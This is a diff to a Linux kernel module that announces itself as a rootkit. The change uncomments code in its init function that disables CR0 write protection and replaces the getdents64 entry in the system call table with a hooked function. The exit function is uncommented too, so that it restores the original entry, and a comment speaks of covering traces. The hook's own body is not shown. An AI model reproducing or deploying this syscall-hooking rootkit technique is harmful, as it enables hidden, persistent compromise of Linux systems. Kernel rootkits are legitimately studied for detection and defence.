@@ -112,12 +112,12 @@ static int __init trivial_init(void) {
 		return -1;
 	}
 
-	/*
+	
 	sys_getdents_original = (sys_getdents_t) syscall_table[__NR_getdents64];
 	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
 	syscall_table[__NR_getdents64] = sys_getdents_new;
 	write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
-	*/
+	
 		
 	printk(KERN_INFO "Registered rootkit with the kernel. Thanks kernel\n");
 
@@ -127,11 +127,11 @@ static int __init trivial_init(void) {
 /* function called on module removal, should reverse init function */
 static void __exit trivial_exit(void) {
 	
-	/* restore our hooked functions 
+	/* restore our hooked functions */
 	write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
 	syscall_table[__NR_getdents64] = sys_getdents_original;
 	write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
-	*/
+	
 	/* unregister the device, cover our traces */
 	device_destroy(devClass, MKDEV(majorNum, 0));
 	class_unregister(devClass);
